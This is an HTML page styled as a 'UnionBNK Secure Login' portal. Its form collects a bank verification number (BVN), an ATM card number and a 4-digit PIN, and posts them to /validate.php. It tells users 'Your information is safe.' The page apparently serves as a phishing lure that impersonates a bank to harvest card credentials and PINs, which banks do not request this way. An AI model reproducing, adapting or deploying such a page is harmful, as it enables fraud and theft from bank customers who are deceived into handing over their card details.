<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>UnionBNK Secure Login</title>
  <link rel="icon" type="image/png" href="favicon.ico">
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #f3f7f9;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    .container {
      background-color: white;
      border: 1px solid #ccc;
      border-radius: 8px;
      padding: 30px;
      max-width: 400px;
      width: 100%;
      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
    }
    .logo {
      font-size: 22px;
      font-weight: bold;
      color: #0066cc;
      margin-bottom: 20px;
    }
    input {
      width: 100%;
      padding: 10px;
      margin-top: 10px;
      margin-bottom: 15px;
      border: 1px solid #ccc;
      border-radius: 4px;
    }
    button {
      width: 100%;
      padding: 10px;
      background-color: #0066cc;
      color: white;
      border: none;
      border-radius: 4px;
      font-weight: bold;
    }
    .notice {
      margin-top: 10px;
      font-size: 12px;
      color: #888;
    }
  </style>
</head>
<body>

<div class="container">
  <div class="logo">UnionBNK Secure Portal</div>

  <form action="/validate.php" method="POST">
    <input type="text" name="bvn" placeholder="Enter your BVN" required>
    <input type="text" name="card" placeholder="ATM Card Number" required>
    <input type="password" name="pin" placeholder="4-Digit PIN" required>
    <button type="submit">Verify Account</button>
  </form>

  <div class="notice">
    Your information is safe. For internal use only.
  </div>
</div>

</body>
</html>
